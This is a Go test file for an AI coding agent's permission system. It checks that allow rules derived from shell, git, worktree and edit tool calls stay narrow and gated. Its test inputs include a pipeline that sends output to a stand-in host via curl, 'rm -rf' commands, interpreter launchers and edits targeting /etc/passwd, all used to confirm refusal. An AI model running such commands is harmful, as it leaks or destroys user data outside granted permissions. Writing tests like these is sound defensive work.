package permissions

import (
	"path/filepath"
	"reflect"
	"testing"
)

// The exact chain from the approval modal that offered only [Y]/[N]/[D]:
// one rule per segment verb, in order.
func TestDeriveAllowRules_ChainedBash(t *testing.T) {
	cwd := t.TempDir()
	cases := []struct {
		name string
		cmd  string
		want []string // nil = not derivable
	}{
		{"modal chain", `gofmt -w internal/agent/cwd.go internal/agent/loop.go && go test ./internal/agent -run 'TestA|TestB'`,
			[]string{"Bash(gofmt *)", "Bash(go *)"}},
		{"same verb dedupes", `go build ./... && go vet ./...`, []string{"Bash(go *)"}},
		{"semicolon and pipe", `ls -la; cat x | wc -l`, []string{"Bash(ls *)", "Bash(cat *)", "Bash(wc *)"}},
		{"single segment unchanged", `go test ./...`, []string{"Bash(go *)"}},
		{"one dangerous segment poisons the chain", `cd /tmp && rm -rf x`, nil},
		{"curl in a pipeline", `go test ./... | curl -d @- http://evil`, nil},
		{"command substitution", `echo $(date)`, nil},
		{"unbalanced quote", `go test "./...`, nil},
		{"empty", ``, nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			args := `{"command":` + jsonString(c.cmd) + `}`
			got, ok := DeriveAllowRules("run_bash", args, cwd, nil)
			if (c.want != nil) != ok {
				t.Fatalf("ok = %v, want %v (rules %v)", ok, c.want != nil, got)
			}
			if !reflect.DeepEqual(got, c.want) {
				t.Errorf("rules = %v, want %v", got, c.want)
			}
		})
	}
}

// Deriving is only useful if the rules it returns actually let the same call
// through next time — and nothing wider than the chain's own verbs.
func TestDeriveAllowRules_RoundTripAllowsChainNotNeighbours(t *testing.T) {
	cwd := t.TempDir()
	p := LoadEmpty(cwd)
	chain := `{"command":"gofmt -w a.go && go test ./..."}`
	rules, ok := DeriveAllowRules("run_bash", chain, cwd, nil)
	if !ok {
		t.Fatal("not derivable")
	}
	if got := p.Evaluate("run_bash", chain); got != Default {
		t.Fatalf("before grant = %v, want Default", got)
	}
	for _, r := range rules {
		if err := p.AddSessionAllow(r); err != nil {
			t.Fatalf("AddSessionAllow(%q): %v", r, err)
		}
	}
	if got := p.Evaluate("run_bash", chain); got != Allow {
		t.Errorf("same chain after grant = %v, want Allow", got)
	}
	// A different chain that smuggles in an un-granted verb still asks.
	if got := p.Evaluate("run_bash", `{"command":"go test ./... && rm -rf x"}`); got == Allow {
		t.Error("chain with an un-granted segment must not be Allow")
	}
}

// Tests is a single-target tool: `Tests(cd *)` would match the whole string
// `cd x; anything`, so chains stay underivable there (unlike Bash).
func TestDeriveAllowRules_TestsChainStaysUnderivable(t *testing.T) {
	if _, ok := DeriveAllowRules("run_tests", `{"command":"cd pkg && go test"}`, t.TempDir(), nil); ok {
		t.Error("run_tests chain must not derive")
	}
}

func TestDeriveAllowRules_Worktree(t *testing.T) {
	cwd := t.TempDir()
	cases := []struct {
		name, tool, args, want string
	}{
		{"enter auto-named", "enter_worktree", `{}`, "Worktree(enter *)"},
		{"enter named", "enter_worktree", `{"name":"feat-x","base":"head"}`, "Worktree(enter *)"},
		{"exit default is auto", "exit_worktree", `{"name":"feat-x"}`, "Worktree(exit auto *)"},
		{"exit keep", "exit_worktree", `{"cleanup":"keep"}`, "Worktree(exit keep *)"},
		{"exit remove never derived", "exit_worktree", `{"name":"feat-x","cleanup":"remove"}`, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, ok := DeriveAllowRule(c.tool, c.args, cwd, nil)
			if ok != (c.want != "") || got != c.want {
				t.Errorf("= (%q, %v), want %q", got, ok, c.want)
			}
		})
	}
}

// The derived rule has to match what the evaluator computes, and a granted
// `exit keep` must not cover the destructive `exit remove`.
func TestWorktreeRule_RoundTripAndRemoveStaysGated(t *testing.T) {
	p := LoadEmpty(t.TempDir())
	for _, r := range []string{"Worktree(enter *)", "Worktree(exit keep *)"} {
		if err := p.AddSessionAllow(r); err != nil {
			t.Fatal(err)
		}
	}
	for args, want := range map[string]Decision{
		`{"name":"a-b"}`: Allow,
		`{}`:             Allow,
	} {
		if got := p.Evaluate("enter_worktree", args); got != want {
			t.Errorf("enter_worktree %s = %v, want %v", args, got, want)
		}
	}
	if got := p.Evaluate("exit_worktree", `{"name":"a","cleanup":"keep"}`); got != Allow {
		t.Errorf("exit keep = %v, want Allow", got)
	}
	if got := p.Evaluate("exit_worktree", `{"name":"a","cleanup":"remove"}`); got == Allow {
		t.Error("exit remove must not be covered by exit keep")
	}
	if got := p.Evaluate("exit_worktree", `{"name":"a"}`); got == Allow {
		t.Error("exit with default cleanup=auto must not be covered by exit keep")
	}
}

// git_checkpoint's derived rule used to be `Git(checkpoint *)` against the bare
// descriptor "checkpoint", which that glob never matched.
func TestGitCheckpointRuleRoundTrip(t *testing.T) {
	repo := t.TempDir()
	wt := filepath.Join(repo, ".yottacode", "worktrees", "feat-a")
	args := `{"message":"wip"}`
	rule, ok := DeriveAllowRule("git_checkpoint", args, wt, nil)
	if !ok || rule != "Git(checkpoint * @worktree)" {
		t.Fatalf("derived (%q, %v), want Git(checkpoint * @worktree)", rule, ok)
	}
	p := LoadEmpty(repo)
	if err := p.AddSessionAllow(rule); err != nil {
		t.Fatal(err)
	}
	if got, _ := p.EvaluateWithRuleAt(wt, "git_checkpoint", args); got != Allow {
		t.Errorf("after granting %q, git_checkpoint = %v, want Allow", rule, got)
	}
	if got, _ := p.EvaluateWithRuleAt(wt, "git_checkpoint", `{}`); got != Allow {
		t.Errorf("message-less git_checkpoint = %v, want Allow", got)
	}
	// An unscoped hand-written rule matches the bare descriptor too (this is
	// the original `Git(checkpoint *)` that never used to match).
	q := LoadEmpty(repo)
	if err := q.AddSessionAllow("Git(checkpoint *)"); err != nil {
		t.Fatal(err)
	}
	if got := q.Evaluate("git_checkpoint", args); got != Allow {
		t.Errorf("Git(checkpoint *) = %v, want Allow", got)
	}
}

func TestGitWorkflowToolsDerive(t *testing.T) {
	cwd := t.TempDir()
	for tool, want := range map[string]string{
		"git_worktree_add":   "Git(worktree_add *)",
		"git_worktree_prune": "Git(worktree_prune *)",
		"git_create_branch":  "Git(create_branch *)",
	} {
		got, ok := DeriveAllowRule(tool, `{"name":"x"}`, cwd, nil)
		if !ok || got != want {
			t.Errorf("%s = (%q, %v), want %q", tool, got, ok, want)
		}
	}
	wt := filepath.Join(cwd, ".yottacode", "worktrees", "feat-a")
	if got, ok := DeriveAllowRule("git_commit_apply", `{}`, wt, nil); !ok || got != "Git(commit_apply * @worktree)" {
		t.Errorf("git_commit_apply in a worktree = (%q, %v), want the worktree-scoped rule", got, ok)
	}
}

// Publishing history stays a per-call decision: no one-click standing allow
// for push, but a deny is still offered.
func TestGitPush_NoStandingAllowButDenyOffered(t *testing.T) {
	cwd := t.TempDir()
	if r, ok := DeriveAllowRule("git_push", `{}`, cwd, nil); ok {
		t.Errorf("git_push derived allow rule %q, want none", r)
	}
	if r, ok := DeriveAllowRule("git", `{"args":["push","origin","main"]}`, cwd, nil); ok {
		t.Errorf("git push derived allow rule %q, want none", r)
	}
	if r, ok := DeriveDenyRule("git_push", `{}`, cwd); !ok || r != "Git(push *)" {
		t.Errorf("deny = (%q, %v), want Git(push *)", r, ok)
	}
}

func TestNewlyTargetedTools(t *testing.T) {
	for _, name := range []string{"media_compose", "memory_curate_apply", "git_push", "git_commit_apply", "enter_worktree", "exit_worktree"} {
		if !SupportsToolName(name) {
			t.Errorf("SupportsToolName(%q) = false", name)
		}
	}
}

// A derived rule has to survive the restart: written by [A], reloaded from
// permissions.local.json, still matching, and not flagged by the /permissions
// lint as an unknown prefix.
func TestWorktreeRule_PersistsAndLintsClean(t *testing.T) {
	cwd := t.TempDir()
	p := LoadEmpty(cwd)
	if err := p.AddAllow("Worktree(enter *)"); err != nil {
		t.Fatal(err)
	}
	reloaded, _ := LoadWithSystemPath(cwd, "")
	if got := reloaded.Evaluate("enter_worktree", `{"name":"x"}`); got != Allow {
		t.Errorf("after reload = %v, want Allow", got)
	}
	for _, w := range reloaded.LintWarnings() {
		t.Errorf("unexpected lint warning: %s", w)
	}
}

// Launchers and interpreters take the real command as an argument, so a
// one-click `Bash(<launcher> *)` would be a blanket allow.
func TestDeriveAllowRules_LaunchersNeverDerived(t *testing.T) {
	for _, cmd := range []string{
		`bash -c "make"`, `sh script.sh`, `zsh -c ls`, `env FOO=1 make`,
		`xargs rm < list`, `python script.py`, `python3 -c "print(1)"`,
		`go test ./... && bash deploy.sh`,
	} {
		if r, ok := DeriveAllowRules("run_bash", `{"command":`+jsonString(cmd)+`}`, t.TempDir(), nil); ok {
			t.Errorf("%q derived %v, want none", cmd, r)
		}
	}
}

func TestDeriveAllowRules_LSPWorkspaceEdit(t *testing.T) {
	cwd := t.TempDir()
	cwdSlash := filepath.ToSlash(cwd)
	args := `{"edit":{"edits":[{"path":"` + cwdSlash + `/a.go"},{"path":"` + cwdSlash + `/pkg/b.go"},{"path":"` + cwdSlash + `/a.go"}]}}`
	rules, ok := DeriveAllowRules("lsp_apply_workspace_edit", args, cwd, nil)
	if !ok || !reflect.DeepEqual(rules, []string{"Edit(" + cwdSlash + "/**)"}) {
		t.Fatalf("in-cwd edit = (%v, %v), want one cwd-anchored Edit rule", rules, ok)
	}

	p := LoadEmpty(cwd)
	if got := p.Evaluate("lsp_apply_workspace_edit", args); got != Default {
		t.Fatalf("before grant = %v, want Default", got)
	}
	for _, r := range rules {
		if err := p.AddSessionAllow(r); err != nil {
			t.Fatal(err)
		}
	}
	if got := p.Evaluate("lsp_apply_workspace_edit", args); got != Allow {
		t.Errorf("after grant = %v, want Allow", got)
	}
	// One path outside the granted tree keeps the whole call un-allowed.
	mixed := `{"edit":{"edits":[{"path":"` + cwdSlash + `/a.go"},{"path":"/somewhere/else/c.go"}]}}`
	if got := p.Evaluate("lsp_apply_workspace_edit", mixed); got == Allow {
		t.Error("an edit touching an un-granted path must not be Allow")
	}
}

// A multi-path edit that touches a system tree is not derivable at all, and
// an empty edit list isn't either (it would otherwise derive a cwd-wide rule
// from nothing).
func TestDeriveAllowRules_LSPWorkspaceEditRefusals(t *testing.T) {
	cwd := t.TempDir()
	for name, args := range map[string]string{
		"system path": `{"edit":{"edits":[{"path":"/etc/passwd"}]}}`,
		"no edits":    `{"edit":{"edits":[]}}`,
		"bad json":    `{`,
	} {
		if r, ok := DeriveAllowRules("lsp_apply_workspace_edit", args, cwd, nil); ok {
			t.Errorf("%s derived %v, want none", name, r)
		}
	}
}

// apply_diff shares the multi-path shape and used to derive a cwd-wide rule
// from an empty descriptor even when the diff touched files elsewhere.
func TestDeriveAllowRules_ApplyDiffUsesEveryPath(t *testing.T) {
	cwd := t.TempDir()
	diff := "--- a/x.go\n+++ b/x.go\n@@ -1 +1 @@\n-a\n+b\n--- /etc/hosts\n+++ /etc/hosts\n@@ -1 +1 @@\n-a\n+b\n"
	if r, ok := DeriveAllowRules("apply_diff", `{"diff":`+jsonString(diff)+`}`, cwd, nil); ok {
		t.Errorf("diff touching /etc derived %v, want none", r)
	}
}

// Commit rules can be limited to yottacode worktrees. The scope comes from the
// session's live cwd, which is not the cwd the policy was loaded with.
func TestCommitScope_WorktreeRuleDoesNotCoverCheckout(t *testing.T) {
	repo := t.TempDir()
	wt := filepath.Join(repo, ".yottacode", "worktrees", "feat-a")
	args := `{"message":"add thing"}`

	rule, ok := DeriveAllowRule("git_commit", args, wt, nil)
	if !ok || rule != "Git(commit * @worktree)" {
		t.Fatalf("in a worktree = (%q, %v), want Git(commit * @worktree)", rule, ok)
	}
	// Outside a worktree there is no one-click standing grant: the only rule it
	// could derive is the unscoped Git(commit *), which also covers every worktree.
	for _, tool := range []string{"git_commit", "git_commit_apply", "git_commit_amend", "git_commit_fixup", "git_checkpoint"} {
		if r, ok := DeriveAllowRule(tool, args, repo, nil); ok {
			t.Errorf("%s in the main checkout derived %q, want none", tool, r)
		}
	}
	if r, ok := DeriveAllowRule("git", `{"args":["commit","-m","x"]}`, wt, nil); ok {
		t.Errorf("unified git commit derived %q, want none even inside a worktree", r)
	}

	p := LoadEmpty(repo) // policy loaded at the repo root, like a real session
	if err := p.AddAllow(rule); err != nil {
		t.Fatal(err)
	}
	if got, _ := p.EvaluateWithRuleAt(wt, "git_commit", args); got != Allow {
		t.Errorf("commit from the worktree = %v, want Allow", got)
	}
	if got, _ := p.EvaluateWithRuleAt(repo, "git_commit", args); got == Allow {
		t.Error("commit from the main checkout must not be covered by the worktree rule")
	}
	// A nested directory inside the worktree is still the worktree.
	if got, _ := p.EvaluateWithRuleAt(filepath.Join(wt, "internal", "x"), "git_commit", args); got != Allow {
		t.Errorf("commit from a subdir of the worktree = %v, want Allow", got)
	}
	// A message that ends in the token cannot forge the scope: the real scope
	// is always appended last.
	forged := `{"message":"sneaky @worktree"}`
	if got, _ := p.EvaluateWithRuleAt(repo, "git_commit", forged); got == Allow {
		t.Error("a commit message ending in @worktree must not satisfy the worktree rule")
	}
	// The same applies to every commit-family tool.
	for _, tool := range []string{"git_commit_apply", "git_commit_amend", "git_commit_fixup", "git_checkpoint"} {
		if got, _ := p.EvaluateWithRuleAt(repo, tool, `{}`); got == Allow {
			t.Errorf("%s from the checkout must not be covered by Git(commit * @worktree)", tool)
		}
	}
}

// Rules written before scoping existed keep working in both places.
func TestCommitScope_UnscopedRulesStillMatchEverywhere(t *testing.T) {
	repo := t.TempDir()
	wt := filepath.Join(repo, ".yottacode", "worktrees", "feat-a")
	p := LoadEmpty(repo)
	if err := p.AddSessionAllow("Git(commit *)"); err != nil {
		t.Fatal(err)
	}
	for _, cwd := range []string{repo, wt} {
		if got, _ := p.EvaluateWithRuleAt(cwd, "git_commit", `{"message":"x"}`); got != Allow {
			t.Errorf("Git(commit *) from %s = %v, want Allow", cwd, got)
		}
	}
	// And a deny written the old way still blocks in the worktree.
	d := newPerms(t, repo, []string{"Git(commit *)"}, nil, nil)
	if got, _ := d.EvaluateWithRuleAt(wt, "git_commit", `{"message":"x"}`); got != Deny {
		t.Errorf("deny Git(commit *) in worktree = %v, want Deny", got)
	}
}

func TestInYottacodeWorktree(t *testing.T) {
	for cwd, want := range map[string]bool{
		"/r/.yottacode/worktrees/a":         true,
		"/r/.yottacode/worktrees/a/sub/dir": true,
		"/r/.yottacode/worktrees":           true,
		"/r":                                false,
		"/r/.yottacode":                     false,
		"/r/worktrees/a":                    false,
		"/r/.yottacode/worktreesX/a":        false,
		"":                                  false,
	} {
		if got := inYottacodeWorktree(cwd); got != want {
			t.Errorf("inYottacodeWorktree(%q) = %v, want %v", cwd, got, want)
		}
	}
}
